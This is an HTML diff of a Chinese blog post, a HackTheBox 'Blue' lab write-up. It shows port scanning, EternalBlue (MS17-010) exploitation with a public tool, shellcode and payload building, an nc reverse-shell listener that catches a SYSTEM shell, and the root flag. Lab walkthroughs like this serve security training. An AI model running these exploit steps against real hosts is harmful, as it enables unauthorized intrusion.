@@ -10,7 +10,7 @@
 <meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='OSCP, HTB' /><meta itemprop="name" content="HTB靶机 Blue WriteUp">
 <meta itemprop="description" content=""><meta itemprop="datePublished" content="2022-03-28T17:55:48+08:00" />
 <meta itemprop="dateModified" content="2022-03-28T17:55:48+08:00" />
-<meta itemprop="wordCount" content="1656">
+<meta itemprop="wordCount" content="1795">
 <meta itemprop="keywords" content="OSCP,HTB," /><meta property="og:title" content="HTB靶机 Blue WriteUp" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/hackthebox-blue\/"
-    },"genre": "posts","keywords": "OSCP, HTB","wordcount":  1656 ,
+    },"genre": "posts","keywords": "OSCP, HTB","wordcount":  1795 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/hackthebox-blue\/","datePublished": "2022-03-28T17:55:48+08:00","dateModified": "2022-03-28T17:55:48+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2022-03-28&#32;17:55:48><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-28">2022-03-28</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1656 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2022-03-28&#32;17:55:48><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-28">2022-03-28</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1795 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 4 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -210,7 +210,21 @@
 <h2 id="writeup">WriteUp</h2>
 <p>连接HTB靶场：<code>sudo openvpn  xxxx.ovpn</code></p>
 <p>测试靶机连通性：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl"> └─$ ping -c <span class="m">4</span> 10.10.10.40
 </span></span><span class="line"><span class="cl"> PING 10.10.10.40 <span class="o">(</span>10.10.10.40<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
 </span></span><span class="line"><span class="cl"> <span class="m">64</span> bytes from 10.10.10.40: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">127</span> <span class="nv">time</span><span class="o">=</span><span class="m">238</span> ms
@@ -220,10 +234,88 @@
 </span></span><span class="line"><span class="cl"> --- 10.10.10.40 ping statistics ---
 </span></span><span class="line"><span class="cl"> <span class="m">4</span> packets transmitted, <span class="m">3</span> received, 25% packet loss, <span class="nb">time</span> 3035ms
 </span></span><span class="line"><span class="cl"> rtt min/avg/max/mdev <span class="o">=</span> 237.404/238.524/240.313/1.277 ms
-</span></span></code></pre></div><p>有点延迟和丢包，扫描探测结果可能不准确，需要复核。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有点延迟和丢包，扫描探测结果可能不准确，需要复核。</p>
 <h2 id="0scan">0.SCAN</h2>
 <p>masscan 扫描全端口+ nmap 扫描详细端口信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl"> └─$ sudo masscan -e tun0 -p- --max-rate <span class="m">500</span> 10.10.10.40
 </span></span><span class="line"><span class="cl"> Starting masscan 1.3.2 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2022-03-21 05:48:42 GMT
 </span></span><span class="line"><span class="cl"> Initiating SYN Stealth Scan
@@ -295,19 +387,47 @@
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 117.51 seconds
-</span></span></code></pre></div><p>发现 存在 smb  ms17-010（CVE-2017-0143），操作系统为：Windows 7 Professional 7601 Service Pack 1 ，计算机名: haris-PC</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现 存在 smb  ms17-010（CVE-2017-0143），操作系统为：Windows 7 Professional 7601 Service Pack 1 ，计算机名: haris-PC</p>
 <p>非MSF</p>
 <h2 id="1-ms17-010-利用">1. MS17-010 利用</h2>
 <p>不用msf去攻击</p>
 <p>nmap 只有检测脚本，没有利用脚本，通过网络expdb、Github搜索利用工具。</p>
 <p>最后找了这个：https://github.com/3ndG4me/AutoBlue-MS17-010</p>
 <p>下载代码，并安装依赖，这里我使用了Pipenv创建了单独的环境。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> └─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> └─$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
 </span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/
 </span></span><span class="line"><span class="cl"> └─$ pip install -r requirements.txt
-</span></span></code></pre></div><p>制作利用代码，可以利用shellcode文件夹下的 shell_prep.sh 辅助生成。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>制作利用代码，可以利用shellcode文件夹下的 shell_prep.sh 辅助生成。</p>
 <p>这里直接使用msfvenom进行生成，并加入shellcode混合</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/
 </span></span><span class="line"><span class="cl"> └─$ nasm -f bin eternalblue_kshellcode_x64.asm -o evilKernel.bin
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/shellcode<span class="o">]</span>
@@ -320,8 +440,35 @@
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010/shellcode<span class="o">]</span>
 </span></span><span class="line"><span class="cl"> └─$ cat evilKernel.bin evilReverse.bin &gt; evilPayload.bin
-</span></span></code></pre></div><p>依据Github 的Readme 命令帮助，输入目标ip，payload 和Groom连接数，执行利用脚本：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python eternalblue_exploit7.py &lt;TARGET-IP&gt; &lt;PATH/TO/SHELLCODE/sc_all.bin&gt; &lt;Number of Groom Connections <span class="o">(</span>optional<span class="o">)</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依据Github 的Readme 命令帮助，输入目标ip，payload 和Groom连接数，执行利用脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python eternalblue_exploit7.py &lt;TARGET-IP&gt; &lt;PATH/TO/SHELLCODE/sc_all.bin&gt; &lt;Number of Groom Connections <span class="o">(</span>optional<span class="o">)</span>&gt;
 </span></span><span class="line"><span class="cl"> <span class="o">(</span>HTB<span class="o">)</span> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~/HTB/AutoBlue-MS17-010<span class="o">]</span>
 </span></span><span class="line"><span class="cl"> └─$ python3 eternalblue_exploit7.py 10.10.10.40 shellcode/evilPayload.bin <span class="m">2</span>
 </span></span><span class="line"><span class="cl"> shellcode size: <span class="m">1232</span>
@@ -342,8 +489,34 @@
 </span></span><span class="line"><span class="cl"> good response status: INVALID_PARAMETER
 </span></span><span class="line"><span class="cl"> <span class="k">done</span>
 </span></span><span class="line"><span class="cl"> 
-</span></span></code></pre></div><p>这里 <code>&lt;Number of Groom Connections (optional)&gt;</code>虽然是可选项，但经过多次不成功后，我按照参考文献2进行设置，同样在多次尝试后，成功获得shell，且为System权限。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里 <code>&lt;Number of Groom Connections (optional)&gt;</code>虽然是可选项，但经过多次不成功后，我按照参考文献2进行设置，同样在多次尝试后，成功获得shell，且为System权限。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> ┌──<span class="o">(</span>xavier㉿xavier<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
 </span></span><span class="line"><span class="cl"> └─$ nc -nlvp <span class="m">4444</span>
 </span></span><span class="line"><span class="cl"> listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
 </span></span><span class="line"><span class="cl"> connect to <span class="o">[</span>10.10.14.2<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.40<span class="o">]</span> <span class="m">49159</span>
@@ -363,7 +536,9 @@
 </span></span><span class="line"><span class="cl"> C:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
 </span></span><span class="line"><span class="cl"> <span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
 </span></span><span class="line"><span class="cl"> 3515d002af86dbfff3ce6f9bbffe7ede
-</span></span></code></pre></div><p>利用他人的工具，最后做出来了，但让我意识到对漏洞的一知半解，在攻击过程中会消耗大量的时间，甚至走上弯路。平时需要加强对漏洞的研究，了解漏洞的相关影响因素。</p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用他人的工具，最后做出来了，但让我意识到对漏洞的一知半解，在攻击过程中会消耗大量的时间，甚至走上弯路。平时需要加强对漏洞的研究，了解漏洞的相关影响因素。</p>
 <p>MSF: 略</p>
 <h2 id="他山之石">他山之石</h2>
 <ul>
